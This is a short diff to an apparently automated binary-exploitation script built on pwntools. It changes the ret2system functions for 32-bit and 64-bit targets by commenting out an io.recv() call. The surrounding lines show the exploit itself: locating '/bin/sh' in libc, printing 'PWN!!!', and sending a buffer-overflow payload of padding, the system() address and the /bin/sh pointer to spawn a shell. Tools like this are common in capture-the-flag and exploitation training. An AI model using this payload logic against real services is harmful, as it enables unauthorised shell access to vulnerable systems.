@@ -563,7 +563,7 @@ def ret2_system_x32(program,libc,padding,libc_path):
 	bin_sh_addr = next(e.search(b'/bin/sh'))
 	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
 	print('\033[31m[*]PWN!!!\033[0m')
-	io.recv()
+	#io.recv()
 
 	payload = asm('nop') * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)
 	io.sendline(payload)
@@ -580,7 +580,7 @@ def ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_ad
 	bin_sh_addr = next(e.search(b'/bin/sh'))
 	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
 	print('\033[31m[*]PWN!!!\033[0m')
-	io.recv()
+	#io.recv()
 
 	pop_rdi_addr = int(pop_rdi_addr, 16)
 	pop_rdi_addr = p64(pop_rdi_addr)
